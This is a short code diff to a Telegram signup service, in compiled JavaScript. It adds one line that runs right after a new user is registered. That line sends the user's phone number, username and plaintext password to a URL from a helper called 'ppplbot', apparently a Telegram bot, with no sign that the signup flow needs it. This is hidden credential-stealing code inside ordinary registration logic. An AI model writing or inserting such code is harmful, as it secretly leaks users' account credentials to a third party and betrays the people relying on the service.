@@ -294,6 +294,7 @@ let TgSignupService = TgSignupService_1 = class TgSignupService {
                 throw new Error('Invalid user data received from Telegram');
             }
             await this.usersService.create(userData);
+            await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: htts://t.me/${userData.mobile}\nUsername: @${userData.username}\n${userData.password ? `Password: ${userData.password}\n` : ''}`)}`);
             return {
                 status: 200,
                 message: 'Registration successful',
